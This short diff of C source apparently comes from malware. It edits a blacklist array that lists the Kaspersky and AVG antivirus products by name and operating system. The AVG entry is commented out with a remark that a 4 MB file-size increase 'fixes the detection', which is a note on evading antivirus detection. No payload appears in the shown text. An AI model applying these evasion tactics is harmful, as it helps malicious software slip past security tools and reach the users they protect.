@@ -32,8 +32,8 @@ typedef struct
 BLACKLIST_ITEM g_BlackList[MAX_BLACKLIST_ITEMS] = 
 {
 	{L"Kaspersky",	  OS_XP},
-	{L"Касперского" , OS_XP},
-	{L"AVG",		  OS_ALL}
+	{L"Касперского" , OS_XP}
+	//{L"AVG",		  OS_ALL} /* 4mb size increase fixes the detection */
 };
 #endif
 
